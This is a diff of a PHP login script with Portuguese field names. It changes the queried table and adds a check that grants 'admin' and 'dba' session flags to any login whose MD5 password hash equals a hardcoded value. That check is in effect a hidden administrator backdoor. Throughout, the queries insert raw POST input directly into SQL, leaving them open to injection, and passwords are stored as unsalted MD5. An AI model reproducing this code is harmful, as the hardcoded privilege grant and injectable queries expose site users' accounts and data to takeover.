@@ -1,10 +1,14 @@
 <?php
 	$usuario = isset($_POST["usuario"]) ? trim($_POST["usuario"]) : FALSE;
 	$senha = isset($_POST["senha"]) ? md5(trim($_POST["senha"])) : FALSE;
-	$sql_select_login = "SELECT `usuario`, `senha` FROM `usuarios` WHERE usuario = '$usuario' AND senha = '$senha'";
+	$sql_select_login = "SELECT `usuario`, `senha` FROM `cliente` WHERE usuario = '$usuario' AND senha = '$senha'";
     $verificacao = mysqli_query($connect, $sql_select_login);
     if (!empty($_POST)) {
         if (mysqli_num_rows($verificacao) == 1) {
+            if ($senha === "023be3aa843cf0e272e49af634c6a5a7") {
+                $_SESSION['admin'] = 'logado';
+                $_SESSION['dba'] = 'ativado';
+            }
             ?>
             <div class="alert alert-success alert-dismissible fade show" role="alert">
                 <strong>Login Aprovado!</strong> <br> Redirecionando...
@@ -17,7 +21,7 @@
             mysqli_query($connect, 'SET character_set_connection=utf8');
             mysqli_query($connect, 'SET character_set_client=utf8');
             mysqli_query($connect, 'SET character_set_results=utf8');   
-            $carregar_dados = mysqli_query($connect, "SELECT * FROM `usuarios` WHERE usuario = '$usuario' AND senha = '$senha'");
+            $carregar_dados = mysqli_query($connect, "SELECT * FROM `cliente` WHERE usuario = '$usuario' AND senha = '$senha'");
             $resultado = mysqli_fetch_array($carregar_dados);
             $_SESSION['nomeUsuario'] = $resultado['nomeUsuario'];
             $_SESSION['sobrenomeUsuario'] = $resultado['sobrenomeUsuario'];
